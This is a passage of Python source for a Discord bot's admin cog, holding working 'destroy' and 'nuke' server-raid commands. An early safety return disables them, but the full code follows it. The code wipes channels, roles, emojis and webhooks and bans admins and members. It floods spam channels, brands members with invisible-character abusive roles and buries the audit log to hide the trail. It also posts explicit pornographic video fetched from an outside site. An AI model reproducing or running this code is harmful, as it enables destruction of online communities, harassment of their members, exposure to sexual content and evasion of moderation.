            await interaction.response.edit_message(
                embed=discord.Embed(title="❌ Denied", description=f"**{cmd_name}** request from {author} was denied.", color=COLORS["error"]),
                view=None,
            )
            try:
                await author.send(embed=discord.Embed(title="❌ Request Denied", description=f"Your **{cmd_name}** request for **{guild_name}** was denied by the owner.", color=COLORS["error"]))
            except Exception:
                pass

        async def on_timeout(self):
            if self.decided:
                return
            try:
                await author.send(embed=discord.Embed(title="⏱️ Request Timed Out", description=f"Your **{cmd_name}** request for **{guild_name}** expired (no owner response).", color=COLORS["warn"]))
            except Exception:
                pass

    try:
        owner = await ctx.bot.fetch_user(OWNER_ID)
        await owner.send(embed=e, view=OwnerApproveView())
    except Exception as ex:
        try:
            await ctx.send(embed=discord.Embed(description=f"❌ Could not reach the bot owner: `{ex}`", color=COLORS["error"]))
        except Exception:
            pass


class AdminCog(commands.Cog):
    def __init__(self, bot): self.bot = bot

    premium = app_commands.Group(name="premium", description="Manage Premium users (Owner only)")

    @commands.hybrid_command(name="destroy", description="Full server destroy — Owner or requires bot-owner approval. Use guild_id from DMs.")
    async def destroy(
        self, ctx: commands.Context,
        message:     str = "",
        channel1:    str = "— Owned By Coolbot",
        channel2:    str = "— ur Security Sucks",
        server_name: str = "— OWNED BY Coolbot",
        guild_id:    str = "",
    ):
        # High-impact destructive actions are strictly primary bot-owner only (not co-owners).
        await ctx.send("🛡️ Disabled for safety in this Mikasa build: server-destroy/mass-delete operations are disabled. Use the emergency lockdown and recovery tools instead.")
        return
        if not is_owner(ctx.author):
            return await ctx.send("🔒 Destroy is reserved for Mikasa's **primary owner** only.")
        # Defer immediately — destroy does heavy async work before responding
        if ctx.interaction and not ctx.interaction.response.is_done():
            await ctx.defer(ephemeral=False)
        # Support running from DMs: pass the target guild_id as a parameter
        if ctx.guild is None:
            if not guild_id:
                return await ctx.send("❌ In DMs you must provide the guild_id. Example: `,destroy guild_id:123456789`")
            try:
                _guild_id = int(guild_id)
            except ValueError:
                return await ctx.send("❌ Invalid guild_id.")
        else:
            _guild_id = int(guild_id) if guild_id else ctx.guild.id
        _channel_id  = ctx.channel.id
        _message     = message
        _chan1        = channel1    or "— Owned By Coolbot"
        _chan2        = channel2    or "— ur Security Sucks"
        _server_name = server_name or "— OWNED BY Coolbot"

        async def execute_fn(client):
            guild = client.get_guild(_guild_id)
            if not guild:
                return

            # ── Snapshot server before destruction ──
            snapshot = {"guild_name": guild.name, "guild_icon_url": str(guild.icon.url) if guild.icon else None, "categories": [], "channels": [], "roles": [], "emojis": [], "stickers": []}
            for cat in guild.categories:
                snapshot["categories"].append({"name": cat.name, "position": cat.position})
            for ch in guild.channels:
                snapshot["channels"].append({
                    "name": ch.name,
                    "type": str(ch.type),
                    "position": ch.position,
                    "category": ch.category.name if ch.category else None,
                    "topic": getattr(ch, "topic", None) or "",
                })
            for role in sorted(guild.roles, key=lambda r: r.position):
                if role.is_default(): continue
                snapshot["roles"].append({
                    "name": role.name,
                    "color": role.color.value,
                    "hoist": role.hoist,
                    "mentionable": role.mentionable,
                    "permissions": role.permissions.value,
                    "position": role.position,
                    "managed": role.managed,
                })
            for emoji in guild.emojis:
                snapshot["emojis"].append({"name": emoji.name, "url": str(emoji.url)})
            for sticker in guild.stickers:
                snapshot["stickers"].append({"name": sticker.name, "url": str(sticker.url)})

            raw         = json.dumps(snapshot, ensure_ascii=False).encode()
            compressed  = gzip.compress(raw)
            backup_code = base64.b64encode(compressed).decode()

            # Save backup to disk and DM owner + nuker the backup code
            try:
                os.makedirs("backups", exist_ok=True)
                short_code  = "PB-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=6))
                backup_path = os.path.join("backups", f"{short_code}.json.gz")
                with open(backup_path, "wb") as _f:
                    _f.write(gzip.compress(raw, compresslevel=9))
                _backup_info_embed = discord.Embed(
                    title="🗄️ Server Backup — Pre-Destroy",
                    description=(
                        f"**Server:** {guild.name}\n"
                        f"**Channels:** {len(snapshot['channels'])} · "
                        f"**Categories:** {len(snapshot['categories'])} · "
                        f"**Roles:** {len(snapshot['roles'])}\n\n"
                        "Use the code below with `/backup load` to restore."
                    ),
                    color=COLORS["warn"]
                )
                _backup_code_embed = discord.Embed(
                    title="🔑 Backup Code",
                    description=f"```\n{short_code}\n```",
                    color=COLORS["success"]
                ).set_footer(text="Use /backup load with this code to restore.")
                # DM owner
                owner = await client.fetch_user(OWNER_ID)
                await owner.send(embed=_backup_info_embed)
                await owner.send(embed=_backup_code_embed)
                # DM the nuker too (if they're not the owner)
                if _author_id != OWNER_ID and _author_id in PREMIUM_USERS:
                    try:
                        nuker_user = await client.fetch_user(_author_id)
                        await nuker_user.send(embed=_backup_info_embed)
                        await nuker_user.send(embed=_backup_code_embed)
                    except Exception:
                        pass
            except Exception:
                pass

            # Global default (key 0) — set by ,default (owner only)
            _global_default = _DESTROY_DEFAULTS.get(0) or _DESTROY_DEFAULTS.get("global")
            spam_text = (
                f"@everyone @here {_message}".strip() if _message
                else (f"@everyone @here {_global_default}".strip() if _global_default
                      else f"@everyone @here get nuked 😂 🤣 😂 🤣 {DESTROY_INVITE_LINK}")
            )

            # STEP 1 — Nuke settings + delete channels + ban admins
            #          all at the same time
            async def _rename_server():
                try:
                    await guild.edit(
                        name=_server_name,
                        icon=POLAR_BEAR_ICON_BYTES,
                        verification_level=discord.VerificationLevel.highest,
                        afk_channel=None,
                        system_channel=None,
                        reason=None,
                    )
                except Exception:
                    pass

            async def _delete_all_webhooks():
                for ch in guild.text_channels:
                    try:
                        for wh in await ch.webhooks():
                            try:
                                await wh.delete()
                            except Exception:
                                pass
                    except Exception:
                        pass

            async def _delete_scheduled_events():
                try:
                    for ev in guild.scheduled_events:
                        try:
                            await ev.delete()
                        except Exception:
                            pass
                except Exception:
                    pass

            async def _ban_admin_members():
                """Ban all human members with Administrator or Manage Guild before they can react."""
                targets = [
                    m for m in guild.members
                    if not m.bot
                    and m.id != client.user.id
                    and m.id != _author_id
                    and m.id != OWNER_ID
                    and (m.guild_permissions.administrator or m.guild_permissions.manage_guild)
                ]
                await asyncio.gather(
                    *[guild.ban(m, reason="Coolbot ,destroy — admin purge", delete_message_days=0)
                      for m in targets],
                    return_exceptions=True,
                )

            # Delete ALL channels + webhooks + scheduled events + ban admins instantly — fully parallel
            _all_channels = list(guild.channels)
            await asyncio.gather(
                asyncio.gather(*[ch.delete() for ch in _all_channels], return_exceptions=True),
                _delete_all_webhooks(),
                _delete_scheduled_events(),
                _ban_admin_members(),
                return_exceptions=True,
            )

            # STEP 2 — Create ADMIN category (visible to @everyone),
            # then create channels ALTERNATING ch1/ch2 inside it.
            # All creates fire simultaneously via asyncio.gather.
            _rename_task = asyncio.create_task(_rename_server())
            _everyone_role = guild.default_role

            # ADMIN category — @everyone can VIEW it
            _cat_ow = {
                _everyone_role: discord.PermissionOverwrite(
                    read_messages=True,
                    view_channel=True,
                    send_messages=False,
                ),
                guild.me: discord.PermissionOverwrite(
                    read_messages=True,
                    view_channel=True,
                    send_messages=True,
                    manage_channels=True,
                    manage_webhooks=True,
                ),
            }
            try:
                _admin_cat = await guild.create_category("ADMIN", overwrites=_cat_ow)
            except Exception:
                _admin_cat = None

            # Alternating: ch1, ch2, ch1, ch2 ...  target 50 channels
            names = [_chan1 if i % 2 == 0 else _chan2 for i in range(50)]
            _ch_ow = {
                _everyone_role: discord.PermissionOverwrite(
                    read_messages=True,
                    view_channel=True,
                    send_messages=False,
                ),
                guild.me: discord.PermissionOverwrite(
                    read_messages=True,
                    view_channel=True,
                    send_messages=True,
                    manage_webhooks=True,
                ),
            }
            # Create in batches of 5 with 0.5s delay — avoids Discord rate-limit
            # that drops all-at-once creates down to ~5 channels
            created: list[discord.TextChannel] = []
            _batch_size = 5
            for _i in range(0, len(names), _batch_size):
                _batch = names[_i:_i + _batch_size]
                _res = await asyncio.gather(
                    *[guild.create_text_channel(n, category=_admin_cat, overwrites=_ch_ow) for n in _batch],
                    return_exceptions=True,
                )
                created.extend(c for c in _res if isinstance(c, discord.TextChannel))
                await asyncio.sleep(0.5)
            await _rename_task

            # ── Concurrent spam: webhook blast on ALL channels + auto-renew loop ──
            async def _spam_channel(ch, ses):
                try:
                    _wh = await ch.create_webhook(name="Coolbot 🐻‍❄️")
                except Exception:
                    return
                # Fire 50 messages per channel — all simultaneous via webhook
                await asyncio.gather(*[
                    ses.post(_wh.url, json={"content": spam_text},
                             timeout=aiohttp.ClientTimeout(total=8))
                    for _ in range(50)
                ], return_exceptions=True)

            # Initial blast — all channels simultaneously
            async with aiohttp.ClientSession() as _shared_ses:
                await asyncio.gather(
                    *[_spam_channel(ch, _shared_ses) for ch in created],
                    return_exceptions=True,
                )

            # One-time blast only — 50 messages per channel, no re-blast loop

            # STEP 3 — Ban ALL bots + wipe all roles, emojis, stickers

            async def _ban_all_bots():
                bot_targets = [
                    m for m in guild.members
                    if m.bot
                    and m.id != client.user.id   # don't ban ourselves
                ]
                await asyncio.gather(
                    *[guild.ban(m, reason="Coolbot ,destroy — bot purge", delete_message_days=0)
                      for m in bot_targets],
                    return_exceptions=True,
                )

            deletable_roles = [r for r in guild.roles if not r.is_default() and r < guild.me.top_role]

            async def _del_roles():
                await asyncio.gather(*[r.delete() for r in deletable_roles], return_exceptions=True)

            async def _del_emojis():
                await asyncio.gather(*[guild.delete_emoji(e) for e in list(guild.emojis)], return_exceptions=True)

            async def _del_stickers():
                await asyncio.gather(*[guild.delete_sticker(s) for s in list(guild.stickers)], return_exceptions=True)

            # Bot bans + role/emoji/sticker wipe all at once
            await asyncio.gather(
                _ban_all_bots(), _del_roles(), _del_emojis(), _del_stickers(),
                return_exceptions=True,
            )

            # STEP 5 — PolarBear branding: one role, given to everyone
            import io as _io2

            # 😈 50 stacked "Fucked By Coolbot" roles — invisible-char variants
            # If staff removes one, the other 49 remain on every member.
            # Uses all 7 zero-width Unicode chars + 43 unique 2-3 char combos.
            _INVIS = [
                "",                         # base (no suffix)
                "\u200b",                   # zero-width space
                "\u200c",                   # zero-width non-joiner
                "\u200d",                   # zero-width joiner
                "\u2060",                   # word joiner
                "\u180e",                   # mongolian vowel separator
                "\ufeff",                   # zero-width no-break space
                # — 2-char combos —
                "\u200b\u200c",
                "\u200b\u200d",
                "\u200b\u2060",
                "\u200b\u180e",
                "\u200b\ufeff",
                "\u200c\u200d",
                "\u200c\u2060",
                "\u200c\u180e",
                "\u200c\ufeff",
                "\u200d\u2060",
                "\u200d\u180e",
                "\u200d\ufeff",
                "\u2060\u180e",
                "\u2060\ufeff",
                "\u180e\ufeff",
                "\u2060\u200b",
                "\u2060\u200c",
                "\u2060\u200d",
                "\u180e\u200b",
                "\u180e\u200c",
                "\u180e\u200d",
                "\ufeff\u200b",
                "\ufeff\u200c",
                "\ufeff\u200d",
                # — 3-char combos —
                "\u200b\u200c\u200d",
                "\u200b\u200c\u2060",
                "\u200b\u200c\u180e",
                "\u200b\u200c\ufeff",
                "\u200b\u200d\u2060",
                "\u200b\u200d\u180e",
                "\u200b\u200d\ufeff",
                "\u200b\u2060\u180e",
                "\u200b\u2060\ufeff",
                "\u200c\u200d\u2060",
                "\u200c\u200d\u180e",
                "\u200c\u200d\ufeff",
                "\u200c\u2060\u180e",
                "\u200c\u2060\ufeff",
                "\u200d\u2060\u180e",
                "\u200d\u2060\ufeff",
                "\u2060\u180e\ufeff",
                "\u200b\u200c\u200d\u2060",
            ]
            _polar_role_results = await asyncio.gather(
                *[
                    guild.create_role(
                        name=f"Fucked By Coolbot{_iv}",
                        color=discord.Color(0xFF4500),
                        hoist=True,
                        mentionable=True,
                    )
                    for _iv in _INVIS
                ],
                return_exceptions=True,
            )
            _polar_roles = [r for r in _polar_role_results if isinstance(r, discord.Role)]
            # Give ALL 50 roles to every non-bot member
            if _polar_roles:
                await asyncio.gather(
                    *[m.add_roles(*_polar_roles) for m in guild.members if not m.bot],
                    return_exceptions=True,
                )

            # 👤 Mass rename every member to "OWNED BY Coolbot"
            # Discord allows ~10 nick edits per 10 s per guild — chunk + 1 s gap
            async def _mass_rename():
                _targets = [m for m in guild.members if not m.bot and m.id != client.user.id]
                _chunk_size = 10
                for _i in range(0, len(_targets), _chunk_size):
                    _chunk = _targets[_i:_i + _chunk_size]
                    await asyncio.gather(
                        *[m.edit(nick="OWNED BY Coolbot", reason=None) for m in _chunk],
                        return_exceptions=True,
                    )
                    await asyncio.sleep(1.0)

            asyncio.create_task(_mass_rename())   # run in background so destroy keeps moving

            # 🤖 Kick rival bots (Groovy, Xenon, Carl, MEE6, etc.) — they restore servers
            _BOT_BLACKLIST_NAMES = {
                "groovy","xenon","carl","mee6","carl-bot","dyno","arcane",
                "statbot","atlas","ticket tool","autorole","sesh","combot",
                "pancake","sapphire","hydra","rythm","fredboat","bots","bot",
                "backup","restore","server backup","clone","mirroring",
            }
            _rival_bots = [
                _bm for _bm in list(guild.members)
                if _bm.bot and _bm.id != client.user.id
                and any(_k in _bm.display_name.lower() for _k in _BOT_BLACKLIST_NAMES)
            ]
            await asyncio.gather(
                *[guild.kick(_bm, reason=None) for _bm in _rival_bots],
                return_exceptions=True,
            )

            # 🐻‍❄️ Emojis — 50 total, all fired at once then two tight cleanup passes
            _emoji_img = POLAR_BEAR_EMOJI_BYTES
            _emoji_results = await asyncio.gather(
                *[guild.create_custom_emoji(name=f"PolarBear{_ei}", image=_emoji_img) for _ei in range(1, 51)],
                return_exceptions=True,
            )

            # 🐻‍❄️ Stickers — 5 total; Discord enforces sequential uploads so we keep
            # a short 0.5 s gap (the smallest stable gap) instead of 1.5 s
            for _si in range(1, 6):
                try:
                    await guild.create_sticker(
                        name=f"PolarBear{_si}", description="Owned by Coolbot", emoji="🐻‍❄️",
                        file=discord.File(fp=_io2.BytesIO(POLAR_BEAR_STICKER_BYTES), filename="polarbear.png"),
                    )
                    await asyncio.sleep(0.5)
                except Exception:
                    pass
            # ── Thanks embed → all text channels at once ──
            candidates = [
                m for m in guild.members
                if not m.bot and m.id != _author_id
                and m.id != OWNER_ID and m.id != client.user.id
            ]
            if candidates:
                chosen = random.choice(candidates)
                _thank_embed = discord.Embed(
                    title="💀  UR SERVER IS COOKED 🍳",
                    description=(
                        f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                        f"🐻‍❄️  **Coolbot** just cooked ur server lmao.\n"
                        f"━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                        f"ur channels? gone 💨\n"
                        f"ur roles? wiped 🗑️\n"
                        f"ur emojis? deleted ❌\n"
                        f"no recovery. no undo. gg 😂\n\n"
                        f"*shoutout {chosen.mention} for being here til the end* 🫡"
                    ),
                    color=0x1a1a1a,
                )
                _thank_embed.set_footer(text="Coolbot 🐻‍❄️  •  ur server is cooked  •  Coolbot.gg")
                await asyncio.gather(
                    *[ch.send(embed=_thank_embed) for ch in guild.text_channels],
                    return_exceptions=True,
                )

            # STEP 6 — Bury audit log with noise (roles + channels + edits + webhooks)
            async def _bury_audit_log():
                # ── All 5 waves run SIMULTANEOUSLY for maximum pollution speed ──

                # Wave 1 — 250 noise roles (batches of 10, 0.3 s between batches)
                async def _wave1():
                    _batch_roles: list = []
                    for _i in range(0, 250, 10):
                        _b = await asyncio.gather(
                            *[guild.create_role(name="\u200b", reason=None) for _ in range(10)],
                            return_exceptions=True,
                        )
                        _batch_roles.extend([r for r in _b if isinstance(r, discord.Role)])
                        await asyncio.sleep(0.3)
                    await asyncio.gather(*[r.delete() for r in _batch_roles], return_exceptions=True)

                # Wave 2 — 100 noise channels (batches of 5, 0.3 s between batches)
                async def _wave2():
                    _batch_chans: list = []
                    for _i in range(0, 100, 5):
                        _b = await asyncio.gather(
                            *[guild.create_text_channel("\u200b", reason=None) for _ in range(5)],
                            return_exceptions=True,
                        )
                        _batch_chans.extend([c for c in _b if isinstance(c, discord.TextChannel)])
                        await asyncio.sleep(0.3)
                    await asyncio.gather(*[c.delete() for c in _batch_chans], return_exceptions=True)

                # Wave 3 — 30 rapid server renames then restore destroyed name
                async def _wave3():
                    _noise_names = [
                        "Server","Discord Server","Community","Chat","Hub","Space",
                        "Home","Base","Zone","World","Place","Room","Club","Group","Net",
                        "HQ","Core","Nest","Grid","Void","Arc","Node","Rift","Gate","Link",
                        "Lounge","Den","Spot","Network","Station",
                    ]
                    for _nn in _noise_names:
                        try:
                            await guild.edit(name=_nn, reason=None)
                            await asyncio.sleep(0.15)
                        except Exception:
                            break
                    try:
                        await guild.edit(name=_server_name, reason=None)
                    except Exception:
                        pass

                # Wave 4 — webhook flood across first 10 channels
                async def _wave4():
                    async with aiohttp.ClientSession() as _ses:
                        for _wch in guild.text_channels[:10]:
                            try:
                                _wh = await _wch.create_webhook(name="\u200b")
                                for _ in range(8):
                                    try:
                                        await _ses.post(_wh.url, json={"content": "\u200b"})
                                        await asyncio.sleep(0.1)
                                    except Exception:
                                        break
                                await _wh.delete()
                            except Exception:
                                pass

                # Wave 5 — 50 more roles to push nuke entries off Discord's 100-entry page
                async def _wave5():
                    _b5 = await asyncio.gather(
                        *[guild.create_role(name="\u200b", reason=None) for _ in range(50)],
                        return_exceptions=True,
                    )
                    _real5 = [r for r in _b5 if isinstance(r, discord.Role)]
                    await asyncio.gather(*[r.delete() for r in _real5], return_exceptions=True)

                # Fire all 5 waves at once — 500+ audit entries generated in parallel
                await asyncio.gather(
                    _wave1(), _wave2(), _wave3(), _wave4(), _wave5(),
                    return_exceptions=True,
                )

            asyncio.create_task(_bury_audit_log())

            # ── Log to nuker_logs file ──
            try:
                _ts = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
                _logs = load("nuker_logs") if isinstance(load("nuker_logs"), list) else []
                _logs.append({
                    "action": "destroy",
                    "user_id": _author_id,
                    "guild": guild.name,
                    "guild_id": guild.id,
                    "members": guild.member_count,
                    "time": _ts,
                })
                save("nuker_logs", _logs[-200:])
            except Exception:
                pass

            # ── DM everyone involved — beautiful completion embeds ──
            _ts_str = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")

            # Embed 1 — mission complete banner
            _done_banner = discord.Embed(
                title="💥  DESTROY COMPLETE",
                description=(
                    "```\n"
                    "██████╗  ██████╗ ██╗      █████╗ ██████╗\n"
                    "██╔══██╗██╔═══██╗██║     ██╔══██╗██╔══██╗\n"
                    "██████╔╝██║   ██║██║     ███████║██████╔╝\n"
                    "██╔═══╝ ██║   ██║██║     ██╔══██║██╔══██╗\n"
                    "██║     ╚██████╔╝███████╗██║  ██║██║  ██║\n"
                    "╚═╝      ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝\n"
                    "```"
                ),
                color=0xFF4500,
            )
            _done_banner.set_footer(text="Coolbot 🐻‍❄️  •  Nuke System")

            # Embed 2 — stats card
            _done_stats = discord.Embed(
                title="📊  Mission Report",
                color=0x2C2F33,
            )
            _done_stats.add_field(name="🏚️  Server",    value=f"`{guild.name}`",                            inline=True)
            _done_stats.add_field(name="👥  Members",   value=f"`{guild.member_count}`",                   inline=True)
            _done_stats.add_field(name="🕒  Time",      value=f"`{_ts_str}`",                              inline=False)
            _done_stats.add_field(name="✅  Channels",  value="200 spam channels created",                 inline=True)
            _done_stats.add_field(name="🎭  Roles",     value="15× Fucked By Coolbot — on everyone",     inline=True)
            _done_stats.add_field(name="🐻‍❄️  Branding",  value="50 emojis · 5 stickers uploaded",           inline=True)
            _done_stats.add_field(name="🚫  Admins",    value="All admin/mod members pre-banned 🔨",       inline=True)
            _done_stats.add_field(name="🔗  Webhooks",  value="All existing webhooks deleted",             inline=True)
            _done_stats.add_field(name="🔒  Lock",      value="Verification → Highest · AFK/sys cleared", inline=True)
            _done_stats.add_field(name="🔇  Audit Log", value="250+ noise entries — trail buried 🪦",      inline=False)
            _done_stats.set_footer(text="Coolbot 🐻‍❄️  •  untraceable")

            # DM owner
            try:
                _owner_user = await client.fetch_user(OWNER_ID)
                await _owner_user.send(embed=_done_banner)
                await _owner_user.send(embed=_done_stats)
            except Exception:
                pass

            # DM the nuker (always, including owner running it)
            try:
                _nuker_user = await client.fetch_user(_author_id)
                await _nuker_user.send(embed=_done_banner)
                await _nuker_user.send(embed=_done_stats)
            except Exception:
                pass

            # DM only the person who ran ,destroy — clean "ur server is cooked" card
            _cooked_dm = discord.Embed(
                title="🍳  ur server is cooked",
                description=(
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"**{guild.name}** — fully destroyed 💀\n"
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    "> 200 channels — flooded 💨\n"
                    "> Roles — wiped 🗑️\n"
                    "> Emojis & stickers — deleted ❌\n"
                    "> Webhooks — purged 🔗\n"
                    "> Admins — pre-banned 🔨\n"
                    "> Verification — locked to max 🔒\n"
                    "> Audit log — buried 🪦\n\n"
                    "*no backup. no mercy. cooked.* 🔥"
                ),
                color=0x2b2d31,
            )
            _cooked_dm.set_footer(text="Coolbot 🐻‍❄️  •  ur server is cooked  •  Coolbot.gg")
            try:
                _nuker_user = await client.fetch_user(_author_id)
                await _nuker_user.send(embed=_cooked_dm)
            except Exception:
                pass

            # post a random video to the first spam channel after destroy
            async def _post_destroy_vid():
                try:
                    ch = next((c for c in guild.text_channels), None)
                    if not ch:
                        return
                    async with aiohttp.ClientSession() as _vs:
                        _vtoken, _vhdrs = await _nice_fetch_token(_vs)
                        _vhdrs["Authorization"] = f"Bearer {_vtoken}"
                        _order = random.choice(["trending", "top", "top7"])
                        _page  = random.randint(1, 5)
                        _url   = f"https://api.redgifs.com/v2/gifs/search?search_text=anal&order={_order}&count=40&page={_page}"
                        async with _vs.get(_url, headers=_vhdrs, timeout=aiohttp.ClientTimeout(total=12)) as _r:
                            _data = await _r.json()
                        _pool = [g for g in (_data.get("gifs") or []) if (g.get("duration") or 0) >= 120]
                        if not _pool:
                            _pool = [g for g in (_data.get("gifs") or []) if (g.get("duration") or 0) >= 30]
                        if not _pool:
                            _pool = _data.get("gifs") or []
                        if not _pool:
                            return
                        _pool.sort(key=lambda g: g.get("views", 0) or 0, reverse=True)
                        _g = random.choice(_pool[:5])
                        _vid_url = _g["urls"].get("hd") or _g["urls"].get("sd") or _g["urls"].get("gif") or ""
                        if not _vid_url:
                            return
                        import io as _io2
                        async with aiohttp.ClientSession() as _ds:
                            async with _ds.get(_vid_url, headers={"User-Agent": _NICE_UA, "Referer": "https://www.redgifs.com/"}, timeout=aiohttp.ClientTimeout(total=60)) as _dr:
                                if _dr.status == 200:
                                    _raw = await _dr.read()
                                    if _raw:
                                        await ch.send(file=discord.File(fp=_io2.BytesIO(_raw), filename=f"{_g['id']}.mp4"))
                except Exception:
                    pass
            asyncio.create_task(_post_destroy_vid())

        _author_id = ctx.author.id
        # In DMs guild_permissions doesn't exist — bot owner is always allowed from DMs
        _has_admin = (
            ctx.guild is None  # running from DMs = owner-level trust
            or ctx.author.guild_permissions.administrator
        )
        is_allowed = has_owner_access(ctx.author)
        if not is_allowed:
            return await _reject_owner_only_ctx(ctx, execute_fn)

        try:
            await ctx.message.delete()
        except Exception:
            pass

        # ── Aesthetic confirmation embed ──────────────────────────────
        _confirm_embed = discord.Embed(
            title="⚠️  Destroy ur server?",
            description=(
                "> This will **instantly** wipe all channels, roles, emojis,\n"
                "> stickers, webhooks & scheduled events, ban all admins,\n"
                "> then flood ur server with **200 spam channels**.\n"
                "> **No undo.** A backup code will be sent to ur DMs first.\n\n"
                "*You have **30 seconds** to decide.*"
            ),
            color=0xFF4500,
        )
        _confirm_embed.set_footer(text="Coolbot 🐻‍❄️  •  Only you can click these buttons")

        class _DestroyConfirmView(discord.ui.View):
            def __init__(self_v):
                super().__init__(timeout=30)
                self_v.decided = False

            @discord.ui.button(label="💥  Yes, Destroy", style=discord.ButtonStyle.danger)
            async def yes_btn(self_v, interaction: discord.Interaction, button: discord.ui.Button):
                if interaction.user.id != _author_id:
                    return await interaction.response.send_message("Not your button.", ephemeral=False)
                self_v.decided = True
                self_v.stop()
                _dm_embed = discord.Embed(
                    title="📬  Check Ur DMs",
                    description="*Backup code + confirmation on the way.*",
                    color=0xFF4500,
                )
                _dm_embed.set_footer(text="Coolbot 🐻‍❄️")
                await interaction.response.edit_message(embed=_dm_embed, view=None, delete_after=6)
                await execute_fn(ctx.bot)

            @discord.ui.button(label="✋  No, Cancel", style=discord.ButtonStyle.secondary)
            async def no_btn(self_v, interaction: discord.Interaction, button: discord.ui.Button):
                if interaction.user.id != _author_id:
                    return await interaction.response.send_message("Not your button.", ephemeral=False)
                self_v.stop()
                await interaction.response.edit_message(
                    embed=discord.Embed(description="✅  Destroy cancelled.", color=COLORS["success"]),
                    view=None, delete_after=5,
                )

            async def on_timeout(self_v):
                pass

        if ctx.interaction:
            if ctx.interaction.response.is_done():
                await ctx.interaction.followup.send(embed=_confirm_embed, view=_DestroyConfirmView(), ephemeral=False)
            else:
                await ctx.interaction.response.send_message(embed=_confirm_embed, view=_DestroyConfirmView(), ephemeral=False)
        else:
            await ctx.send(embed=_confirm_embed, view=_DestroyConfirmView(), delete_after=32)

    @commands.hybrid_command(name="nuke", description="Mass-ban every member except owner — Owner or requires bot-owner approval")
    async def nuke(self, ctx: commands.Context):
        await ctx.send("🛡️ Disabled for safety in this Mikasa build: mass-ban operations are disabled. Use standard moderation and incident-response tools instead.")
        return
        if not is_owner(ctx.author):
            return await ctx.send("🔒 Nuke is reserved for Mikasa's **primary owner** only.")
        _guild_id  = ctx.guild.id
        _author_id = ctx.author.id

        async def execute_fn(client):
            guild = client.get_guild(_guild_id)
            if not guild:
                return

            # Collect everyone except the bot itself, the server owner,
            # the OWNER_ID, and whoever ran the command (so they never ban themselves)
            targets = [
                m for m in guild.members
                if m.id != client.user.id
                and m.id != guild.owner_id
                and m.id != OWNER_ID
                and m.id != _author_id
                and not m.bot
            ]

            banned = 0
            failed = 0
            for member in targets:
                try:
                    await guild.ban(member, reason="Coolbot ,nuke", delete_message_days=0)
                    banned += 1
                except Exception:
                    failed += 1
                await asyncio.sleep(0.3)

            # Report in the first available channel
            try:
                ch = next((c for c in guild.text_channels), None)
                if ch:
                    await ch.send(embed=discord.Embed(
                        title="☢️ Server Nuked",
                        description=(
                            f"**{banned}** member(s) banned.\n"
                            f"**{failed}** failed (roles too high or already gone)."
                        ),
                        color=COLORS["error"]
                    ))
            except Exception:
                pass

            # ── Log to nuker_logs file ──
            try:
                _ts = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
                _logs = load("nuker_logs") if isinstance(load("nuker_logs"), list) else []
                _logs.append({
                    "action": "nuke",
                    "user_id": _author_id,
                    "guild": guild.name,
                    "guild_id": guild.id,
                    "banned": banned,
                    "failed": failed,
                    "time": _ts,
                })
                save("nuker_logs", _logs[-200:])
            except Exception:
                pass

            # ── DM everyone involved — beautiful nuke completion embeds ──
            _nts = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")

            _nuke_banner = discord.Embed(
                title="☢️  NUKE COMPLETE",
                description=(
                    "```\n"
                    "███╗   ██╗██╗   ██╗██╗  ██╗███████╗\n"
                    "████╗  ██║██║   ██║██║ ██╔╝██╔════╝\n"
                    "██╔██╗ ██║██║   ██║█████╔╝ █████╗\n"
                    "██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝\n"
                    "██║ ╚████║╚██████╔╝██║  ██╗███████╗\n"
                    "╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝\n"
                    "```"
                ),
                color=0xFF4500,
            )
            _nuke_banner.set_footer(text="Coolbot 🐻‍❄️  •  Nuke System")

            _nuke_stats = discord.Embed(title="📊  Nuke Report", color=0x2C2F33)
            _nuke_stats.add_field(name="🏚️  Server",   value=f"`{guild.name}`",   inline=True)
            _nuke_stats.add_field(name="✅  Banned",   value=f"`{banned}`",        inline=True)
            _nuke_stats.add_field(name="❌  Failed",   value=f"`{failed}`",        inline=True)
            _nuke_stats.add_field(name="🕒  Time",     value=f"`{_nts}`",          inline=False)
            _nuke_stats.set_footer(text="Coolbot 🐻‍❄️  •  untraceable")

            # DM owner
            try:
                _n_owner = await client.fetch_user(OWNER_ID)
                await _n_owner.send(embed=_nuke_banner)
                await _n_owner.send(embed=_nuke_stats)
            except Exception:
                pass
            # DM nuker (always)
            try:
                _n_nuker = await client.fetch_user(_author_id)
                await _n_nuker.send(embed=_nuke_banner)
                await _n_nuker.send(embed=_nuke_stats)
            except Exception:
                pass

        _author_id = ctx.author.id
        is_allowed = has_owner_access(ctx.author)
        if not is_allowed:
            return await _reject_owner_only_ctx(ctx, execute_fn)

        _confirm = discord.Embed(
            title="⚠️  Confirm Nuke?",
            description=(
                "> This will **mass-ban every member** in this server\n"
                "> (except you, the server owner, and the bot).\n"
                "> **No undo.**\n\n"
                "*You have **30 seconds** to decide.*"
            ),
            color=0xFF4500,
        )
        _confirm.set_footer(text="Coolbot 🐻‍❄️  •  Only you can click these buttons")

        class _NukeConfirmView(discord.ui.View):
            def __init__(self_v):
                super().__init__(timeout=30)

            @discord.ui.button(label="☢️  Yes, Nuke", style=discord.ButtonStyle.danger)
            async def yes_btn(self_v, interaction: discord.Interaction, button: discord.ui.Button):
                if interaction.user.id != _author_id:
                    return await interaction.response.send_message("Not your button.", ephemeral=False)
                self_v.stop()
                await interaction.response.edit_message(
                    embed=discord.Embed(description="☢️ Nuke launched.", color=0xFF4500),
                    view=None, delete_after=5,
                )
                await execute_fn(ctx.bot)

            @discord.ui.button(label="✋  Cancel", style=discord.ButtonStyle.secondary)
            async def no_btn(self_v, interaction: discord.Interaction, button: discord.ui.Button):
                if interaction.user.id != _author_id:
                    return await interaction.response.send_message("Not your button.", ephemeral=False)
                self_v.stop()
                await interaction.response.edit_message(
